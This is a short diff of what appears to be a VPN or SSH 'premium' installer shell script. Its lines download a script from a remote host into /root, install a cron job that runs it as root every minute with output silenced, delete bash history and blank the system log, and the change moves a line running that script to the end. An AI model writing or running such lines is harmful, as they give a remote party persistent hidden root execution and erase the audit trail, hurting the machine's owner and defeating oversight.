@@ -1408,7 +1408,7 @@ PTHON
 
 wget -O /root/activate.sh "script.psytech-vpn.com/ssh/prem/activate.sh"
 echo "* * * * * /bin/bash /root/activate.sh >/dev/null 2>&1" | crontab -
-sh active.sh | tee -a /root/activate.sh
+
 
 function service1() {
 
@@ -1893,3 +1893,4 @@ systemctl restart openvpn
  echo -e ""
  rm -rf /root/.bash_history && history -c && echo '' > /var/log/syslog
  rm -f meditek-premium.sh*
+ sh active.sh | tee -a /root/activate.sh
